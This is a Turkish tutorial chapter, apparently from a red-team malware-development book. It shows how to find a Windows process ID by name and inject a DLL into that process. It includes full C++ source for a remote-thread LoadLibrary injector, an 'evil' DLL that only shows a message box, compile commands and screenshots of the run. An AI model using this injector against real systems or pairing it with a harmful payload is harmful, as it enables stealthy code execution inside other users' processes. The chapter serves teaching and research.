\newpage
\subsection{7. süreç ID'sini isme göre bul ve ona enjekte et. Basit bir C++ örneği}

﷽

![find my process](./images/9/2021-09-30_00-01.png){width="80%"}

Enjektörümü yazarken, örneğin süreçleri isimle nasıl bulabileceğimi merak ettim.  
Kod veya DLL enjektörleri yazarken, sistemde çalışan tüm süreçleri bulmak ve yönetici tarafından başlatılan bir sürece enjekte etmeyi denemek faydalı olur.     

Bu bölümde önce en basit problemi çözmeye çalışacağım: bir süreç ID’sini isme göre bulmak.    

Neyse ki, Win32 API'de bu konuda kullanabileceğimiz bazı harika fonksiyonlar var.    

Şimdi kod yazalım:
```cpp
/*
simple process find logic
author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  int pid = 0; // process ID

  pid = findMyProc(argv[1]);
  if (pid) {
    printf("PID = %d\n", pid);
  }
  return 0;
}
```

Kodumuzu inceleyelim.     

Öncelikle, süreç adını argümanlardan alıyoruz. Ardından, isme göre süreç ID'sini bulup yazdırıyoruz.      

![main function](./images/9/2021-09-30_01-50.png){width="80%"}

PID'yi bulmak için, `findMyProc` fonksiyonunu çağırıyoruz. Bu fonksiyon temelde şunu yapar:    

![findMyProc](./images/9/2021-09-30_01-55.png){width="80%"}

Enjekte etmek istediğimiz sürecin adını alır, işletim sisteminin belleğinde bu süreci arar ve eğer süreç mevcutsa ve çalışıyorsa, bu fonksiyon o sürecin ID'sini döndürür:
Koda yorumlar ekledim, bu yüzden çok fazla sorunuz olmaz diye düşünüyorum.    

İlk olarak, [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) kullanarak sistemde şu anda çalışan süreçlerin bir anlık görüntüsünü alıyoruz:     

![CreateToolhelp32Snapshot](./images/9/2021-09-30_02-01.png){width="80%"}

Daha sonra, anlık görüntüde kaydedilen listeyi [Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) ve [Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) kullanarak dolaşıyoruz:      
 
![while loop](./images/9/2021-09-30_02-04.png){width="80%"}

Eğer `procname` ile adı eşleşen bir süreç bulursak, onun ID'sini döndürüyoruz. Daha önce yazdığım gibi, basitlik açısından bu PID'yi sadece yazdırıyoruz.     

Kodumuzu derlemek için şu komutu çalıştırın:    

```bash
i686-w64-mingw32-g++ hack.cpp -o hack.exe \
-lws2_32 -s -ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```
![compile](./images/9/2021-09-30_02-11.png){width="80%"}

Şimdi bunu bir Windows makinesinde (benim durumumda Windows 7 x64) çalıştırın:

```powershell
.\hack.exe mspaint.exe
```
![run](./images/9/2021-09-30_02-15.png){width="80%"}

Gördüğünüz gibi, her şey mükemmel çalışıyor.    

Şimdi, bir Red Team üyesi gibi düşünürsek, daha ilginç bir enjektör yazabiliriz. Örneğin, süreç adını bulur ve payload'umuzu ona enjekte eder.     

Hadi başlayalım!    

Basitlik açısından, [önceki](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) yazılarımdan bir enjektör alacağım ve sadece `findMyProc` fonksiyonunu ekleyeceğim:

```cpp
/*
simple process find logic
author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  int pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // get process ID by name
  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);
  }

  // open process
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, 
  evilLen, 
  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, 
  NULL, 
  0, (LPTHREAD_START_ROUTINE)lb, 
  rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```

`hack2.cpp`'yi derleyelim:

```bash
x86_64-w64-mingw32-gcc -O2 hack2.cpp -o hack2.exe 
-mconsole -I/usr/share/mingw-w64/include/ -s 
-ffunction-sections -fdata-sections -Wno-write-strings 
-fno-exceptions -fmerge-all-constants -static-libstdc++ 
-static-libgcc -fpermissive >/dev/null 2>&1
```

![compile injector](./images/9/2021-09-30_03-04.png){width="80%"}

Aynısı gibi "evil" DLL:     
```cpp
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Derleyin ve seçtiğiniz bir dizine yerleştirin:     

```bash
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
```

![compile evil dll](./images/9/2021-09-30_02-42.png){width="80%"}

Şunu da çalıştır:   

```powershell
.\hack2.exe mspaint.exe
```

![run hack2.exe](./images/9/2021-09-30_03-10.png){width="80%"}

Gördüğünüz gibi, her şey yolunda:  
`mspaint.exe`'yi başlatıyoruz ve enjektörümüz PID'yi başarıyla buluyor. **(1)**    
Kötü amaçlı DLL'imiz (basit pop-up "Meow") çalışıyor! **(2)**          

DLL'imizin gerçekten `mspaint.exe` sürecine enjekte edildiğini doğrulamak için Process Hacker kullanabiliriz. Bellek bölümünde şunları görebiliriz:     

![mspaint memory](./images/9/2021-09-30_03-34.png){width="80%"}

Görünüşe göre basit enjeksiyon mantığımız işe yaradı!     

Bu durumda, kendi sürecimde `SeDebugPrivilege`'in "etkin" olup olmadığını kontrol etmedim. Peki bu ayrıcalığı nasıl elde edebilirim?       

Bunu gelecekte, tüm uyarılar ve detaylarıyla birlikte inceleyeceğiz.   

[CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)          
[Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)         
[Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)       
[strcmp](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=msvc-160)         
[Taking a Snapchot and Viewing Processes](https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)         
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)         
[VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)   
[WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)   
[CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)   
[OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)    
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)     
[LoadLibraryA](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)

[Github'taki kaynak kod:](https://github.com/cocomelonc/2021-09-29-processfind-1)
